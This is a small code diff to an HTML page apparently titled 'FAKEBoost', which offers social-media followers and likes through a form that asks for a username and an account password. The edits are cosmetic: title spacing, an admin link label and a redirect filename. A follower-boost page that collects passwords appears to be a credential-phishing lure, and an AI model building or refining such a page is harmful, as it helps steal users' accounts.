@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FAKEBoost —UNLIMITED</title>
+<title>FAKEBoost — UNLIMITED</title>
 
 <style>
 *{
@@ -384,7 +384,7 @@ footer{
         <li><a href="#home">HOME</a></li>
         <li><a href="#followers">FOLLOWERS</a></li>
         <li><a href="#likes">LIKES</a></li>
-        <li><a href="admin.html"></a></li>
+        <li><a href="admin.html">ADMIN</a></li>
     </ul>
 </nav>
 
@@ -503,7 +503,6 @@ footer{
                 <input type="text" id="username" placeholder="Enter username" required>
             </div>
 
-            <!-- USERNAME KE EXACT NICHE PASSWORD FIELD -->
             <div class="group">
                 <label>PASSWORD</label>
                 <input type="password" id="password" placeholder="Enter password" required>
@@ -601,8 +600,9 @@ form.addEventListener("submit", async e => {
 
         const data = await res.json();
 
+        // Redirect URL fixed to lowercase confirmation.html
         const url =
-            "Confirmation.html" +
+            "confirmation.html" +
             "?username=" +
             encodeURIComponent(data.username) +
             "&package=" +
